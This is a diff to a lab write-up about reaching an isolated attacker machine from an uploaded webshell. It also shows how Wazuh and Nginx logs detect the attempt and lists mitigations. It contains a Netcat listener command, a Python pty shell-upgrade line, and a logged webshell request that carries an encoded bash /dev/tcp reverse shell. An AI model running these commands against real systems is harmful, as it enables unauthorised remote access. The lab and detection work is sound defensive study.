@@ -6,7 +6,7 @@ Demonstrate command and control from the uploaded webshell back to the isolated 
 
 ## Commands
 
-Start the listener on Kali:
+Start the listener on Kali with `nc` (Netcat):
 
 ```bash
 nc -lvnp 4444
@@ -42,70 +42,26 @@ index.nginx-debian.html
 upload.php
 uploads
 ```
-
+However we can still upgrade the terminal by executing a python command on the reverse shell `Netcat`:
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 ## Wazuh view
 
-```
+```json
 {
-  "_index": "wazuh-alerts-4.x-2026.10.14",
-  "_id": "Zh6SPKEBBPd67aPA0qa0",
-  "_version": 1,
-  "_score": null,
-  "_source": {
-    "input": {
-      "type": "log"
-    },
-    "agent": {
-      "ip": "10.10.20.10",
-      "name": "reverse-proxy",
-      "id": "002"
-    },
-    "manager": {
-      "name": "wazuh-server"
-    },
-    "data": {
-      "protocol": "GET",
-      "srcip": "10.10.10.10",
-      "id": "504",
-      "url": "/uploads/malicious.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%22"
-    },
-    "rule": {
-      "firedtimes": 1,
-      "mail": false,
-      "level": 5,
-      "description": "Web server 500 error code (server error).",
-      "groups": [
-        "web",
-        "accesslog"
-      ],
-      "id": "31120"
-    },
-    "location": "/var/log/nginx/access.log",
-    "decoder": {
-      "name": "web-accesslog"
-    },
-    "id": "1792017614.69325829",
-    "full_log": "10.10.10.10 - - [14/Oct/2026:22:40:12 +0000] \"GET /uploads/malicious.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%22 HTTP/1.1\" 504 176 \"-\" \"curl/8.22.0\"",
-    "timestamp": "2026-10-14T22:40:14.140+0000"
-  },
-  "fields": {
-    "timestamp": [
-      "2026-10-14T22:40:14.140Z"
-    ]
-  },
-  "highlight": {
-    "agent.id": [
-      "@opensearch-dashboards-highlighted-field@002@/opensearch-dashboards-highlighted-field@"
-    ],
-    "location": [
-      "@opensearch-dashboards-highlighted-field@/var/log/nginx/access.log@/opensearch-dashboards-highlighted-field@"
-    ]
-  },
-  "sort": [
-    1792017614140
-  ]
+  "ip": "10.10.20.10",
+  "name": "reverse-proxy",
+  "protocol": "GET",
+  "srcip": "10.10.10.10",
+  "full_log": "10.10.10.10 - - [14/Oct/2026:22:40:12 +0000] \"GET /uploads/malicious.php?cmd=bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%22 HTTP/1.1\" 504 176 \"-\" \"curl/8.22.0\"",
 }
 ```
+The Nginx log records a **504 Gateway Timeout**, this is expected: 
+Nginx waits for a response from the upstream Flask/PHP process, 
+but the reverse shell holds the connection open indefinitely, 
+causing Nginx to timeout. The timeout itself is a detection signal 
+for an unusually long-running request.
 ## Mitigation
 
 - Restrict outbound traffic from the application host with network policies.
